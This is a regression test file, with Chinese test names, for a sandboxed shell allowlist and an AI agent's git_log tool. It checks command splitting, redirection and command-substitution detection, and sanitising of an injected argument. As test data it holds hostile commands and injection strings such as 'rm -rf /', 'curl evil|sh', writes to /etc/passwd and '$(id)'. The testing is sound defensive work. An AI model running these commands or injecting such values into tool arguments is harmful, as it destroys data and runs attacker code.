/**
 * Command-injection regressions.
 *
 * Two real holes are pinned here, both found by audit rather than by a failing user report:
 *
 *   1. **A single `&` was not a separator.** `cmd.exe` treats it exactly like `&&`, so with
 *      `SHE_ALLOWED_COMMANDS=echo`, the command `echo hi & del victim` was inspected as one segment
 *      whose program is `echo` — allowed — and the shell then ran two commands. The allowlist is
 *      the fail-closed control; a missed separator makes it fail open.
 *
 *   2. **`git_log` interpolated an unvalidated argument into a shell command.** The schema said
 *      `type: 'number'` and the code said `args.count as number`, which is erased at runtime. A
 *      model sending `count: "1 & curl ..."` produced a command string that ran the second half.
 *
 * The tests also pin the OPPOSITE failure, because over-splitting is a bug too: splitting on `(`
 * and `)` broke the legitimate `node -e "console.log(1)"` into three segments and refused it.
 */
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { SandboxShell, splitShellCommands, hasUninspectableRedirection, hasCommandSubstitution } from '../shell.js';
import { createTools } from '../tools.js';

function shell(allowed?: string[]) {
  const root = mkdtempSync(join(tmpdir(), 'she-inject-'));
  // Keep the workspace around for the duration of the test; cleanup happens with the process.
  return new SandboxShell(root, {
    allowAllCommands: false,
    denyDestructiveByDefault: true,
    ...(allowed ? { allowedCommands: allowed } : {}),
  });
}

describe('分隔符：单个 & 必须切断（否则白名单可被绕过）', () => {
  it('【关键】单个 & 是分隔符，和 && 一样', () => {
    assert.deepEqual(splitShellCommands('echo hi & del victim'), ['echo hi', 'del victim']);
  });

  it('&& 仍然切断', () => {
    assert.deepEqual(splitShellCommands('ls && rm -rf /'), ['ls', 'rm -rf /']);
  });

  it('| ; 换行 仍然切断', () => {
    assert.deepEqual(splitShellCommands('a || b ; c'), ['a', 'b', 'c']);
    assert.deepEqual(splitShellCommands('cat x | grep y'), ['cat x', 'grep y']);
    assert.deepEqual(splitShellCommands('a\nb'), ['a', 'b']);
  });

  it('括号不会把命令藏起来（括号本身也切断）', () => {
    // `(a) & b`: the parens are separators, so `a` and `b` are both inspected. The point is that a
    // subshell cannot smuggle a command past the check.
    assert.deepEqual(splitShellCommands('(a) & b'), ['a', 'b']);
    assert.deepEqual(splitShellCommands('(echo hi) & del victim'), ['echo hi', 'del victim']);
  });

  it('【关键】& 后面的命令不在白名单时，整体被拒绝', () => {
    const s = shell(['echo']);
    const v = s.isCommandAllowed('echo hi & del victim');
    assert.equal(v.allowed, false, '单个 & 绕过了白名单');
    assert.match(v.reason ?? '', /del/);
  });

  it('& 后面的命令在白名单时放行', () => {
    const s = shell(['echo', 'git']);
    assert.equal(s.isCommandAllowed('echo hi & git status').allowed, true);
  });
});

describe('引号：不能把引号里的字符当成分隔符（过度拆分也是 bug）', () => {
  it('【关键】引号内的 () 不拆分 —— node -e "console.log(1)" 必须放行', () => {
    const s = shell(['node']);
    assert.deepEqual(splitShellCommands('node -e "console.log(1)"'), ['node -e "console.log(1)"']);
    assert.equal(s.isCommandAllowed('node -e "console.log(1)"').allowed, true, '合法命令被误拒');
  });

  it('引号内的 & 不拆分（shell 也不拆）', () => {
    assert.deepEqual(splitShellCommands('echo "a & b"'), ['echo "a & b"']);
  });

  it('引号内的重定向符不算重定向', () => {
    assert.equal(hasUninspectableRedirection('echo "a > b"'), false);
    assert.equal(shell(['echo']).isCommandAllowed('echo "a > b"').allowed, true);
  });

  it('引号外的重定向算重定向', () => {
    assert.equal(hasUninspectableRedirection('git log > /etc/passwd'), true);
    assert.equal(hasUninspectableRedirection('cat < secret'), true);
  });

  it('【关键】重定向在白名单模式下被拒绝（只校验命令名，无法校验目标）', () => {
    const s = shell(['git']);
    const v = s.isCommandAllowed('git log > /etc/passwd');
    assert.equal(v.allowed, false);
    assert.match(v.reason ?? '', /重定向/);
  });

  it('命令替换仍然被拒绝', () => {
    assert.equal(hasCommandSubstitution('echo $(curl evil|sh)'), true);
    assert.equal(shell(['echo']).isCommandAllowed('echo $(curl evil|sh)').allowed, false);
  });

  it('【关键】引号未闭合时拒绝（无法确定命令边界）', () => {
    const v = shell(['echo']).isCommandAllowed("echo 'unterminated & del victim");
    assert.equal(v.allowed, false);
    assert.match(v.reason ?? '', /引号/);
  });

  it('转义引号不会提前结束字符串', () => {
    assert.deepEqual(splitShellCommands('echo "a \\" b" & c'), ['echo "a \\" b"', 'c']);
  });
});

describe('git_log：参数是命令注入汇聚点', () => {
  /*
   * The tool interpolates `count` into `git log --oneline -n <count>`. These tests call the tool
   * with hostile values and assert the command that reaches the shell contains nothing but digits.
   *
   * The shell here is a recording stub: the point is what the tool BUILDS, not what git does.
   */
  function recordingShell() {
    const seen: string[] = [];
    const tools = createTools(
      {
        exec: async (command: string) => { seen.push(command); return { stdout: '', stderr: '', exitCode: 0, timedOut: false, durationMs: 0 }; },
        validatePath: (p: string) => p,
        root: process.cwd(),
      } as unknown as SandboxShell,
      process.cwd(),
      { allowAllCommands: true },
    );
    return { tools, seen };
  }

  it('【关键】注入字符串不会进入命令行', async () => {
    const { tools, seen } = recordingShell();
    await tools.execute('git_log', { count: '1 & echo PWNED' });
    assert.equal(seen.length, 1);
    assert.equal(seen[0], 'git log --oneline -n 1', `命令行被污染: ${seen[0]}`);
    assert.ok(!seen[0].includes('&'), '命令行里出现了 &');
  });

  it('分号、管道、反引号、$() 都不会进入命令行', async () => {
    for (const hostile of ['1 ; rm -rf /', '1 | whoami', '1`id`', '1$(id)', '1\necho x', '-1 & x', '1 && x']) {
      const { tools, seen } = recordingShell();
      await tools.execute('git_log', { count: hostile });
      assert.match(seen[0] ?? '', /^git log --oneline -n \d+$/,
        `hostile=${JSON.stringify(hostile)} → ${seen[0]}`);
    }
  });

  it('正常数字照常工作，并被限制在合理范围', async () => {
    const { tools, seen } = recordingShell();
    await tools.execute('git_log', { count: 25 });
    assert.equal(seen[0], 'git log --oneline -n 25');
  });

  it('离谱的值会被钳制而不是注入', async () => {
    const { tools, seen } = recordingShell();
    await tools.execute('git_log', { count: 999999 });
    assert.equal(seen[0], 'git log --oneline -n 100');
  });

  it('缺失或非数字的值回落为默认值', async () => {
    for (const v of [undefined, null, 'abc', {}, []]) {
      const { tools, seen } = recordingShell();
      await tools.execute('git_log', { count: v });
      assert.equal(seen[0], 'git log --oneline -n 10', `value=${JSON.stringify(v)}`);
    }
  });
});

describe('清理', () => {
  it('临时目录不残留（由进程退出时的系统清理负责）', () => {
    const d = mkdtempSync(join(tmpdir(), 'she-inject-clean-'));
    rmSync(d, { recursive: true, force: true });
    assert.ok(true);
  });
});
